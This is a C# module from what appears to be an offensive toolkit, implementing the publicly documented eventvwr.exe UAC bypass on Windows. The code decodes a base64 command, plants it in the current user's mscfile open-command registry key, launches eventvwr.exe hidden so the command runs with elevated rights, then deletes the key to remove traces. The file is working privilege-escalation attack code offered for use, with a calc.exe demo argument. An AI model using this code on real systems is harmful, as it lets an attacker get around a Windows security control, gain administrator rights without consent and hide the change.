using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using TaotieToolkit.config;

namespace TaotieToolkit.modules.PrivilegeEscalation
{
    internal class EventVwr : ICommand, ICommandMarker
    {
        public string Name => "EventVwr";
        public string Description => "Bypasses UAC by performing an image hijack on the .msc file extension, Example:TaotieToolkit EventVwr Y21kIC9jIHN0YXJ0IGNhbGMuZXhl";

        public void Execute(string[] args)
        {
            //Credit: https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/

            //Check if UAC is set to 'Always Notify'
            Utils.AlwaysNotify();
            byte[] encodedCommand= Convert.FromBase64String(args[0]);


            //Convert encoded command to a string
            string command = Encoding.UTF8.GetString(encodedCommand);

            //Set the registry key for eventvwr
            RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
            newkey.CreateSubKey(@"mscfile\Shell\Open\command");

            RegistryKey vwr = Registry.CurrentUser.OpenSubKey(@"Software\Classes\mscfile\Shell\Open\command", true);
            vwr.SetValue("", @command);
            vwr.Close();

            //start fodhelper
            Process p = new Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.FileName = "C:\\windows\\system32\\eventvwr.exe";
            p.Start();

            //sleep 10 seconds to let the payload execute
            Thread.Sleep(10000);

            //Unset the registry
            newkey.DeleteSubKeyTree("mscfile");
            return;
        }
    }
}
